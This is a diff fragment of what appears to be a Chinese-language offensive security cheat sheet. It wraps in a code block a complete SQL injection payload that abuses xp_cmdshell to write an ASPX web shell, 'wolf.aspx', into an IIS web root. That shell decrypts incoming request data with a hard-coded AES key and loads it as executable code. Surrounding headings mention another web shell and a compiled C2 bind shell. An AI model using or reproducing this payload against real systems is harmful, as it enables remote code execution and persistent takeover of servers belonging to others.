@@ -116,7 +116,9 @@ echo ^<%@ Page Language="C#" %^> > wolf.aspx && echo ^<% if (Request.Cookies.Cou
 
 ### SQL注入 xp_cmdshell写入WebShell wolf.aspx
 
+```bash
 '; EXEC xp_cmdshell 'echo ^<%@ Page Language="C#" %^> > C:\inetpub\wwwroot\wolf.aspx && echo ^<% if (Request.Cookies.Count != 0) {>> C:\inetpub\wwwroot\wolf.aspx && echo byte[] k = Encoding.Default.GetBytes("ca63457538b9b1e0");>> C:\inetpub\wwwroot\wolf.aspx && echo System.IO.Stream s = Request.InputStream;>> C:\inetpub\wwwroot\wolf.aspx && echo byte[] c = new byte[s.Length];>> C:\inetpub\wwwroot\wolf.aspx && echo s.Read(c, 0, c.Length);>> C:\inetpub\wwwroot\wolf.aspx && echo System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("K").Equals(this);>> C:\inetpub\wwwroot\wolf.aspx && echo } %^> >> C:\inetpub\wwwroot\wolf.aspx'; --
+```
 
 ### 编译EXE程序正向马C2
 ```bash
